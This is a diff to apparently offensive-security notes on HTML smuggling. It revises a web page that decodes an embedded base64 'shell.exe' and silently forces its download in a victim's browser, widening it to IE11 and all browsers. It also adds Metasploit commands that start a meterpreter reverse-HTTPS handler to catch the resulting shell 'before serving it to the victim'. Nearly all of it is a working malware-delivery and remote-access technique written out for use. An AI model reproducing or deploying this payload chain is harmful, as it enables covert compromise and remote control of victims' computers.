@@ -18,7 +18,7 @@ base64 /tmp/shell.exe
 
 Remove all **line break** or **new lines**
 
-Add the whole thing to below and serve as html (This works on Chrome only):
+Add the whole thing to below and serve as html (This works for all browser):
 
 ```html
 <html>
@@ -36,34 +36,33 @@ var file ='BASE64 PAYLOAD NEWLINE/BREAK REMOVED'
 var data = base64ToArrayBuffer(file);
 var blob = new Blob([data], {type: 'octet/stream'});
 var fileName = 'shell.exe';
-var a = document.createElement('a');
-document.body.appendChild(a);
-a.style = 'display: none';
-var url = window.URL.createObjectURL(blob);
-a.href = url;
-a.download = fileName;
-a.click();
-window.URL.revokeObjectURL(url);
+if (navigator.msSaveBlob) {
+    // Use IE11's APIs
+    navigator.msSaveBlob(blob, fileName)
+    
+   // Other browsers
+  } else {
+    var a = document.createElement('a');
+    document.body.appendChild(a);
+    a.style = 'display: none';
+    var url = window.URL.createObjectURL(blob);
+    a.href = url;
+    a.download = fileName;
+    a.click();
+    window.URL.revokeObjectURL(url);
+  }
 </script>
 </body>
 </html>
 ```
 
-For Microsoft Edge:
-```html
-<html>
-<body>
-<script>
-function base64ToArrayBuffer(base64) {
-var binary_string = window.atob(base64);
-var len = binary_string.length;
-var bytes = new Uint8Array( len );
-for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);
-}
-return bytes.buffer;
-}
+Remember to ready the mfsconsole before serving it to the victim:
 
-</script>
-</body>
-</html>
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter_reverse_https
+set lhost IP
+set lport PORT
+exploit
 ```
